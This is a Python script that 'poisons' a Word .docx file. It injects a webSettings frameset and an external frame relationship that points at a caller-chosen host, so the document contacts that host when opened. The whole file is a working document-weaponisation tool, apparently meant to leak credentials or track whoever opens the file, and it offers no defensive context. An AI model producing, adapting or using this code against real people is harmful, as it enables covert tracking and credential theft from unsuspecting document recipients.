import tempfile,zipfile
import io,os


class DOCX_LEAK:
    
    def __init__(self,docx_path,host,url_path,element_id="rId1"):

        self.docx_path = docx_path 
        self.host = host 
        self.url_path = url_path
        self.docx_file_read = self.get_docx_file(self.docx_path,"r")
        self.word_webSettings_xml_str = f"<?xml version='1.0'?><w:frameset><w:framesetSplitbar><w:w w:val='60'/><w:color w:val='auto'/><w:noBorder/></w:framesetSplitbar><w:frameset><w:frame><w:name w:val='3'/><w:sourceFileName r:id='{element_id}'/><w:linkedToFile/></w:frame></w:frameset></w:frameset>"

    
    ## WRITE
    def write_word_webSettings_xml(self):
        insert_word_webSettings_xml = self.insert_word_webSettings_xml()
        self.docx_file_read.close()
        self.edit_zip_file(
            "word/webSettings.xml",
            insert_word_webSettings_xml
        )

    def write__word__rels_document_xml_rels(self):
        self.edit_zip_file(    
            "word/_rels/webSettings.xml.rels",
            self.insert_word__rels_document_xml_rels()
        )

    ## INSERT
    def insert_word_webSettings_xml(self):
        return self.insert_before(
            self.read_word_webSettings_xml(),
            "<w:optimizeForBrowser/><w:allowPNG/></w:webSettings>",
            self.word_webSettings_xml_str
        )

    def insert_word__rels_document_xml_rels(self):
        return f"<?xml version='1.0' encoding='UTF-8' standalone='yes'?><Relationships xmlns='http://schemas.openxmlformats.org/package/2006/relationships'><Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame' Target='{self.host}/{self.url_path}' TargetMode='External'/></Relationships>"

      ## READ
   
    ## READ
    def read_word_webSettings_xml(self):
        return self.docx_file_read.read("word/webSettings.xml").decode("utf-8")

    def read_word__rels_document_xml_rels(self):
        return self.docx_file_read.read("word/_rels/document.xml.rels").decode("utf-8")

    ## UTILS
    def insert_after(self,string, string_behind, string_insert):
        i = string.find(string_behind)
        return string[:i + len(string_behind)] + string_insert + string[i + len(string_behind):]

    def insert_before(self,string,string_before,string_insert):
        idx = string.index(string_before)
        return string[:idx] + string_insert + string[idx:]

    def get_docx_file(self,docx_path,opperator):
        return zipfile.ZipFile(docx_path, opperator)

    def edit_zip_file(self, filename, data):
        tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(self.docx_path))
        os.close(tmpfd)
        with zipfile.ZipFile(self.docx_path, 'r') as zin:
            with zipfile.ZipFile(tmpname, 'w') as zout:
                zout.comment = zin.comment
                for item in zin.infolist():
                    if item.filename != filename:
                        zout.writestr(item, zin.read(item.filename))
        os.remove(self.docx_path)
        os.rename(tmpname, self.docx_path)
        with zipfile.ZipFile(self.docx_path, mode='a') as zf:
            zf.writestr(filename, data)
            zf.close()

    def poision_file(self):
        self.write_word_webSettings_xml()
        self.write__word__rels_document_xml_rels()
 

if __name__ == "__main__":
    dxl = DOCX_LEAK("...","...","...")
    dxl.poision_file()